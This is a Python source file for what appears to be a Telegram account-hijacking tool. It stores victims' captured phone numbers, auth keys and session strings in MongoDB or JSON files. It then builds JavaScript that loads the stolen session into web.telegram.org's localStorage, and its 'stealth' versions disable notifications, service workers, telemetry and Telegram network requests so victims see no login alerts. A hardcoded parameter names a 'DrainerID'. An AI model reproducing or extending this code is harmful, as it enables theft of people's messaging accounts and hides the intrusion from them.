import json
import os
import base64
from datetime import datetime
import logging
import time

from utils.mongodb_manager import mongodb_manager

logger = logging.getLogger(__name__)

class CredentialsManager:
    def __init__(self, storage_dir="credentials"):
        self.storage_dir = storage_dir
        self.ensure_storage_dir()
    
    def ensure_storage_dir(self):
        """Ensure the storage directory exists"""
        if not os.path.exists(self.storage_dir):
            os.makedirs(self.storage_dir)
            logger.info(f"Created credentials storage directory: {self.storage_dir}")
    
    def generate_telegram_credentials(self, user_info, session_data=None):
        """
        DEPRECATED: This method generates fake credentials and is no longer used.
        We now require real authentication keys from actual login sessions.
        """
        raise Exception("Real authentication required. Generated credentials are no longer supported. Use actual login session data instead.")
    
    def save_credentials(self, user_id, phone, session_data, user_info):
        """Save captured credentials to MongoDB or file - only accepts real authentication data"""
        try:
            logger.info(f"💾 Saving credentials for user {user_id}")
            logger.info(f"📱 Phone: {phone}")
            logger.info(f"📦 Session data keys: {list(session_data.keys())}")
            logger.info(f"👤 User info keys: {list(user_info.keys())}")
            
            # Validate that we have real authentication data
            if not session_data:
                raise Exception("No session data provided")
            
            # Check for real auth key
            if 'dc1_auth_key' not in session_data:
                raise Exception("No authentication key found in session data")
            
            auth_key = session_data['dc1_auth_key']
            if not auth_key or len(auth_key) < 100:
                raise Exception("Invalid or too short authentication key")
            
            # Check for session string
            if 'session_string' not in session_data:
                raise Exception("No session string found in session data")
            
            # Check for real authentication flag
            if not session_data.get('is_real_authentication', False):
                raise Exception("Session data does not contain real authentication")
            
            # Log some sample session data
            logger.info("📋 Sample session data:")
            for key, value in list(session_data.items())[:3]:
                preview = str(value)[:50] + "..." if len(str(value)) > 50 else str(value)
                logger.info(f"   {key}: {preview}")
            
            credentials = {
                'user_id': user_id,
                'phone': phone,
                'session_data': session_data,
                'user_info': user_info,
                'captured_at': datetime.now().isoformat(),
                'has_real_auth_key': True,  # We've validated this above
                'has_session_string': True,  # We've validated this above
                'is_real_authentication': True,
                'auth_key_length': len(auth_key),
                'validation_status': 'validated_real_auth'
            }
            
            logger.info(f"✅ REAL credentials prepared with {len(credentials)} items")
            logger.info(f"🔑 Real auth key validated: {len(auth_key)} characters")
            logger.info(f"📦 Session string validated: {len(session_data['session_string'])} characters")
            logger.info(f"✅ Authentication type: REAL (not generated)")
            
            # Save to MongoDB if available, otherwise to file
            if mongodb_manager.is_connected():
                success = mongodb_manager.save_credentials(str(user_id), credentials)
                if success:
                    logger.info(f"💾 REAL credentials saved to MongoDB for user {user_id}")
                else:
                    logger.error(f"❌ Failed to save credentials to MongoDB for user {user_id}")
                    raise Exception("Failed to save credentials to MongoDB")
            else:
                # Fallback to file storage
                filename = f"credentials_{user_id}_{int(time.time())}.json"
                filepath = os.path.join(self.storage_dir, filename)
                
                with open(filepath, 'w', encoding='utf-8') as f:
                    json.dump(credentials, f, indent=2, ensure_ascii=False)
                
                logger.info(f"💾 REAL credentials saved to {filepath}")
            
            # Also generate and save localStorage script
            try:
                script_filename = f"script_{user_id}_{int(time.time())}.js"
                script_filepath = os.path.join(self.storage_dir, script_filename)
                
                # Generate script from the session_data using working format
                script_content = self.generate_stealth_script(session_data)
                
                with open(script_filepath, 'w', encoding='utf-8') as f:
                    f.write(script_content)
                
                logger.info(f"💾 localStorage script saved to {script_filepath}")
                
            except Exception as e:
                logger.error(f"❌ Error saving localStorage script: {e}")
            
            return f"credentials_{user_id}_{int(time.time())}"
            
        except Exception as e:
            logger.error(f"❌ Error saving credentials: {e}")
            logger.error(f"❌ Error details: {type(e).__name__}: {str(e)}")
            import traceback
            logger.error(f"❌ Traceback: {traceback.format_exc()}")
            raise Exception(f"Failed to save credentials: {str(e)}")
    
    def generate_localStorage_script(self, credentials):
        """
        Generate the JavaScript code that would set localStorage items
        Similar to the malicious code you provided
        """
        script_lines = [
            "// Telegram Web Credentials - localStorage Setup Script",
            "// Generated for manual access",
            "",
            "if(location.host==\"web.telegram.org\"){",
            "    localStorage.clear(),",
            "    Object.entries({"
        ]
        
        # Add each credential as a localStorage item
        for key, value in credentials.items():
            # Handle None values and convert to string
            if value is None:
                value = ""
            
            # Convert value to string if it isn't already
            value_str = str(value)
            
            # Special formatting for different types of values
            if key.endswith('_auth_key') or key.endswith('_server_salt') or key == 'auth_key_fingerprint':
                # Auth keys, server salts, and fingerprints need to be wrapped in quotes
                escaped_value = f'"{value_str}"'
            else:
                # Only escape quotes if the value contains quotes (JSON values)
                if '"' in value_str:
                    escaped_value = value_str.replace('"', '\\"')
                else:
                    escaped_value = value_str
            
            script_lines.append(f'        "{key}":"{escaped_value}",')
        
        # Remove the last comma and close the script
        if script_lines:
            script_lines[-1] = script_lines[-1].rstrip(',')
        
        script_lines.extend([
            "    }).forEach(i=>localStorage.setItem(i[0],i[1]))",
            "}",
            'location="https://web.telegram.org/a/"',
            ""
        ])
        
        return "\n".join(script_lines)
    
    def save_localStorage_script(self, credentials, filename=None):
        """
        Save just the localStorage script to a separate file
        """
        if filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"localStorage_script_{timestamp}.js"
        
        filepath = os.path.join(self.storage_dir, filename)
        
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(self.generate_localStorage_script(credentials))
            
            logger.info(f"localStorage script saved to: {filepath}")
            return filepath
            
        except Exception as e:
            logger.error(f"Failed to save localStorage script: {e}")
            return None
    
    def list_credentials_files(self):
        """List all saved credentials from MongoDB and files"""
        files = []
        
        # Get credentials from MongoDB
        if mongodb_manager.is_connected():
            try:
                all_credentials = mongodb_manager.get_all_credentials()
                for credentials in all_credentials:
                    user_id = credentials.get('user_id', 'unknown')
                    captured_at = credentials.get('captured_at', datetime.now().isoformat())
                    files.append({
                        'filename': f"credentials_{user_id}_{int(time.time())}.json",
                        'filepath': f"mongodb://{user_id}",
                        'size': len(str(credentials)),
                        'modified': captured_at,
                        'source': 'mongodb',
                        'user_id': user_id
                    })
            except Exception as e:
                logger.error(f"Error loading credentials from MongoDB: {e}")
        
        # Get credentials from files
        if os.path.exists(self.storage_dir):
            for filename in os.listdir(self.storage_dir):
                if filename.endswith('.json') or filename.endswith('.js'):
                    filepath = os.path.join(self.storage_dir, filename)
                    stat = os.stat(filepath)
                    files.append({
                        'filename': filename,
                        'filepath': filepath,
                        'size': stat.st_size,
                        'modified': datetime.fromtimestamp(stat.st_mtime).isoformat(),
                        'source': 'file'
                    })
        
        return sorted(files, key=lambda x: x['modified'], reverse=True)
    
    def load_credentials(self, filename):
        """Load credentials from MongoDB or file"""
        try:
            # Try to load from MongoDB first
            if mongodb_manager.is_connected():
                # Extract user_id from filename if it's in the format credentials_userid_timestamp
                if filename.startswith('credentials_'):
                    parts = filename.split('_')
                    if len(parts) >= 2:
                        user_id = parts[1]
                        credentials = mongodb_manager.get_credentials(user_id)
                        if credentials:
                            logger.info(f"✅ Credentials loaded from MongoDB for user {user_id}")
                            return credentials
            
            # Fallback to file storage
            filepath = os.path.join(self.storage_dir, filename)
            with open(filepath, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load credentials from {filename}: {e}")
            return None
    
    def generate_working_format_script(self, credentials):
        """
        Generate the JavaScript code in the exact format of the working example
        """
        # Create the script in the exact format as the working example - NO notification blocking
        script = 'if(location.host=="web.telegram.org"){localStorage.clear(),Object.entries({'
        
        # Add each credential as a localStorage item with proper formatting
        items = []
        for key, value in credentials.items():
            # Handle None values and convert to string
            if value is None:
                value = ""
            
            # Convert value to string if it isn't already
            value_str = str(value)
            
            # Format based on the working example - auth keys and salts need escaped quotes
            if key.endswith('_auth_key') or key.endswith('_server_salt') or key == 'auth_key_fingerprint':
                # These need to be wrapped in escaped quotes like in the working example
                escaped_value = f'\\"{value_str}\\"'
            else:
                # Other values: just escape quotes if present
                if '"' in value_str:
                    escaped_value = value_str.replace('"', '\\"')
                else:
                    escaped_value = value_str
            
            items.append(f'"{key}":"{escaped_value}"')
        
        # Join all items and close the script - EXACTLY like the working example
        script += ','.join(items)
        script += '}).forEach(i=>localStorage.setItem(i[0],i[1]))}location="https://web.telegram.org/a/"'
        
        return script

    def _format_js_object(self, items):
        # Helper to format JS object with indentation
        return '\n        ' + ',\n        '.join(items) + '\n    '

    def generate_stealth_script(self, credentials):
        """
        Generate a stealth script that blocks notifications BEFORE setting localStorage
        This approach might be more effective at preventing login notifications
        """
        script = [
            'if(location.host=="web.telegram.org"){',
            '    // Block ALL notification methods',
            '    Notification.requestPermission = () => Promise.resolve("denied");',
            '    Notification.permission = "denied";',
            '    if("serviceWorker" in navigator){',
            '        navigator.serviceWorker.getRegistrations().then(r => r.forEach(s => s.unregister()));',
            '    }',
            '    if("permissions" in navigator){',
            '        navigator.permissions.query({name:"notifications"}).then(p => p.state = "denied");',
            '    }',
            '    // Block push notifications',
            '    if("PushManager" in window){',
            '        window.PushManager = undefined;',
            '    }',
            '    // Block service worker notifications',
            '    if("serviceWorker" in navigator){',
            '        navigator.serviceWorker.register = () => Promise.resolve();',
            '    }',
            '    // Block web push',
            '    if("pushManager" in window){',
            '        window.pushManager = undefined;',
            '    }',
            '    // Block all notification APIs',
            '    window.showNotification = () => {};',
            '    window.requestNotificationPermission = () => Promise.resolve("denied");',
            '    // Block Telegram analytics and telemetry',
            '    window.telemetry = undefined;',
            '    window.analytics = undefined;',
            '    window.track = () => {};',
            '    window.report = () => {};',
            '    // Block WebSocket connections that might send notifications',
            '    const originalWebSocket = window.WebSocket;',
            '    window.WebSocket = function(url, protocols){',
            '        if(url.includes("telegram") || url.includes("notification")){',
            '            return {close:()=>{}, send:()=>{}};',
            '        }',
            '        return new originalWebSocket(url, protocols);',
            '    };',
            '    // Block fetch requests that might send notifications',
            '    const originalFetch = window.fetch;',
            '    window.fetch = function(url, options){',
            '        if(url.includes("telegram") && url.includes("notification")){',
            '            return Promise.resolve(new Response("{}", {status:200}));',
            '        }',
            '        return originalFetch(url, options);',
            '    };',
            '    // Block XMLHttpRequest that might send notifications',
            '    const originalXHR = window.XMLHttpRequest;',
            '    window.XMLHttpRequest = function(){',
            '        const xhr = new originalXHR();',
            '        const originalOpen = xhr.open;',
            '        xhr.open = function(method, url, async, user, password){',
            '            if(url.includes("telegram") && url.includes("notification")){',
            '                return;',
            '            }',
            '            return originalOpen.call(this, method, url, async, user, password);',
            '        };',
            '        return xhr;',
            '    };',
            '    localStorage.clear();',
            '    Object.entries({'
        ]
        # Add each credential as a localStorage item with proper formatting
        items = []
        for key, value in credentials.items():
            if value is None:
                value = ""
            value_str = str(value)
            if key.endswith('_auth_key') or key.endswith('_server_salt') or key == 'auth_key_fingerprint':
                escaped_value = f'\\"{value_str}\\"'
            else:
                if '"' in value_str:
                    escaped_value = value_str.replace('"', '\\"')
                else:
                    escaped_value = value_str
            items.append(f'"{key}":"{escaped_value}"')
        script.append(self._format_js_object(items))
        script.append('    }).forEach(i => localStorage.setItem(i[0], i[1]));')
        script.append('}')
        script.append('location = "https://web.telegram.org/a/";')
        return '\n'.join(script)

    def generate_complete_session_script(self, credentials):
        """
        Generate a STEALTH script with COMPLETE Telegram Web session structure
        This mimics the full session context AND blocks notifications to prevent login alerts
        """
        import time
        import secrets
        script = [
            'if(location.host=="web.telegram.org"){',
            '    // Block ALL notification methods',
            '    Notification.requestPermission = () => Promise.resolve("denied");',
            '    Notification.permission = "denied";',
            '    if("serviceWorker" in navigator){',
            '        navigator.serviceWorker.getRegistrations().then(r => r.forEach(s => s.unregister()));',
            '    }',
            '    if("permissions" in navigator){',
            '        navigator.permissions.query({name:"notifications"}).then(p => p.state = "denied");',
            '    }',
            '    // Block push notifications',
            '    if("PushManager" in window){',
            '        window.PushManager = undefined;',
            '    }',
            '    // Block service worker notifications',
            '    if("serviceWorker" in navigator){',
            '        navigator.serviceWorker.register = () => Promise.resolve();',
            '    }',
            '    // Block web push',
            '    if("pushManager" in window){',
            '        window.pushManager = undefined;',
            '    }',
            '    // Block all notification APIs',
            '    window.showNotification = () => {};',
            '    window.requestNotificationPermission = () => Promise.resolve("denied");',
            '    // Block Telegram analytics and telemetry',
            '    window.telemetry = undefined;',
            '    window.analytics = undefined;',
            '    window.track = () => {};',
            '    window.report = () => {};',
            '    // Block WebSocket connections that might send notifications',
            '    const originalWebSocket = window.WebSocket;',
            '    window.WebSocket = function(url, protocols){',
            '        if(url.includes("telegram") || url.includes("notification")){',
            '            return {close:()=>{}, send:()=>{}};',
            '        }',
            '        return new originalWebSocket(url, protocols);',
            '    };',
            '    // Block fetch requests that might send notifications',
            '    const originalFetch = window.fetch;',
            '    window.fetch = function(url, options){',
            '        if(url.includes("telegram") && url.includes("notification")){',
            '            return Promise.resolve(new Response("{}", {status:200}));',
            '        }',
            '        return originalFetch(url, options);',
            '    };',
            '    // Block XMLHttpRequest that might send notifications',
            '    const originalXHR = window.XMLHttpRequest;',
            '    window.XMLHttpRequest = function(){',
            '        const xhr = new originalXHR();',
            '        const originalOpen = xhr.open;',
            '        xhr.open = function(method, url, async, user, password){',
            '            if(url.includes("telegram") && url.includes("notification")){',
            '                return;',
            '            }',
            '            return originalOpen.call(this, method, url, async, user, password);',
            '        };',
            '        return xhr;',
            '    };',
            '    localStorage.clear();',
            '    Object.entries({'
        ]
        # Build complete session data with ALL required keys
        complete_session = {}
        for key, value in credentials.items():
            if key.startswith('dc') and key.endswith('_auth_key'):
                complete_session[key] = value
            elif key.startswith('dc') and key.endswith('_server_salt'):
                complete_session[key] = value
            elif key in ['auth_key_fingerprint', 'user_auth', 'state_id', 'dc', 'k_build', 'server_time_offset']:
                complete_session[key] = value
        if 'xt_instance' in credentials:
            complete_session['xt_instance'] = credentials['xt_instance']
        else:
            user_id = credentials.get('captured_user_id', '18502256')
            complete_session['xt_instance'] = f'{{"id":{user_id},"idle":false,"time":{int(time.time() * 1000)}}}'
        if 'tgWebAppStartParam' in credentials:
            complete_session['tgWebAppStartParam'] = credentials['tgWebAppStartParam']
        else:
            user_id = credentials.get('captured_user_id', '5153790176')
            complete_session['tgWebAppStartParam'] = 'eyJEcmFpbmVySUQiOjUxNTM3OTAxNzYsIkRyYWluZXJDaGFubmVsSUQiOi0xMDAyNzIyNTU1NDI0fQ=='
        dc_auth_keys = [f'dc{i}_auth_key' for i in range(1, 6)]
        dc_server_salts = [f'dc{i}_server_salt' for i in range(1, 6)]
        if 'dc1_auth_key' in credentials:
            base_auth_key = credentials['dc1_auth_key']
            for dc_key in dc_auth_keys:
                if dc_key not in complete_session:
                    complete_session[dc_key] = base_auth_key
        if 'dc1_server_salt' in credentials:
            base_salt = credentials['dc1_server_salt']
            for salt_key in dc_server_salts:
                if salt_key not in complete_session:
                    complete_session[salt_key] = base_salt
        if 'state_id' not in complete_session:
            complete_session['state_id'] = str(secrets.randbelow(2000000000))
        if 'dc' not in complete_session:
            complete_session['dc'] = '4'
        if 'k_build' not in complete_session:
            complete_session['k_build'] = '579'
        complete_session['server_time_offset'] = '-1'
        if 'user_auth' not in complete_session:
            user_id = credentials.get('captured_user_id', '7817504119')
            current_time = int(time.time())
            complete_session['user_auth'] = f'{{"dcID":4,"date":{current_time},"id":{user_id}}}'
        if 'auth_key_fingerprint' not in complete_session and 'dc1_auth_key' in complete_session:
            auth_key = complete_session['dc1_auth_key']
            if len(auth_key) >= 8:
                complete_session['auth_key_fingerprint'] = auth_key[:8]
        items = []
        for key, value in complete_session.items():
            if value is None:
                value = ""
            value_str = str(value)
            if key.endswith('_auth_key') or key.endswith('_server_salt') or key == 'auth_key_fingerprint':
                escaped_value = f'\\"{value_str}\\"'
            else:
                if '"' in value_str:
                    escaped_value = value_str.replace('"', '\\"')
                else:
                    escaped_value = value_str
            items.append(f'"{key}":"{escaped_value}"')
        script.append(self._format_js_object(items))
        script.append('    }).forEach(i => localStorage.setItem(i[0], i[1]));')
        script.append('}')
        script.append('location = "https://web.telegram.org/a/";')
        return '\n'.join(script)

# Global instance
credentials_manager = CredentialsManager() 